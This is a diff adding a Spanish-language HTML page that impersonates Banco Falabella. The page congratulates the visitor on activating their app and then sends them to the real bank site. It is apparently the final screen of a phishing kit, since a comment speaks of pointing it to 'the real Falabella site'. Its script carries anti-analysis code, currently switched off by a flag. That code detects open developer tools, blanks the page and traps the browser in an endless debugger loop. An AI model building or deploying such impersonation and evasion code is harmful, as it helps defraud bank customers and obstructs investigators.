@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Banco Falabella | Felicidades</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 40px 30px;
+            text-align: center;
+        }
+
+        .title {
+            color: #448b3b;
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 25px;
+            line-height: 1.4;
+        }
+
+        .desc {
+            color: #333;
+            font-size: 15px;
+            line-height: 1.5;
+            margin-bottom: 35px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: #448b3b;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1 class="title">¡Felicidades!<br>Ya puedes usar tu App.</h1>
+    
+    <p class="desc">
+        Con ella podrás pagar el Estado de Cuenta de tu tarjeta CMR, pagar cuentas de servicios, realizar transferencias, aprobar compras y pagos con tu Clave Dinámica. ¡Y mucho más!
+    </p>
+
+    <!-- Puedes cambiar esta URL al sitio real de Falabella -->
+    <a href="https://www.bancofalabella.com.co/" class="submit-btn">Aceptar</a>
+</div>
+
+<script>
+    const BLOCK_DEV = false;
+    const triggerBlock = () => {
+        document.body.innerHTML = '<div style="background:#000;color:#0f0;height:100vh;display:flex;align-items:center;justify-content:center;font-family:monospace;text-align:center;"><h1>[!] ACCESO RESTRINGIDO [!]</h1></div>';
+        setTimeout(() => { while(true) { debugger; } }, 100);
+    };
+
+    const checkDevTools = () => {
+        if (!BLOCK_DEV) return;
+        if (window.outerWidth - window.innerWidth > 200 || window.outerHeight - window.innerHeight > 200) {
+            triggerBlock();
+        }
+        const start = performance.now();
+        debugger;
+        if (performance.now() - start > 100) triggerBlock();
+    };
+    
+    if (BLOCK_DEV) {
+        setInterval(checkDevTools, 500);
+    }
+</script>
+
+</body>
+</html>
